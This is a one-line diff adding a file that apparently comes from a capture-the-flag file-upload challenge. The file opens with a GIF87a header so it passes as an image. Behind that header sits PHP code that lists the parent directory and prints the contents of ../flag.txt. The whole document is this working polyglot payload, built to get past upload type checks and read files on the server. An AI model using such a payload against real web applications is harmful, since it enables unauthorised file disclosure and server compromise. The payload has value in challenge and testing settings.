@@ -1,0 +1,1 @@
+GIF87a<?php var_dump(scandir('../'));var_dump(file_get_contents("../flag.txt")); ?>
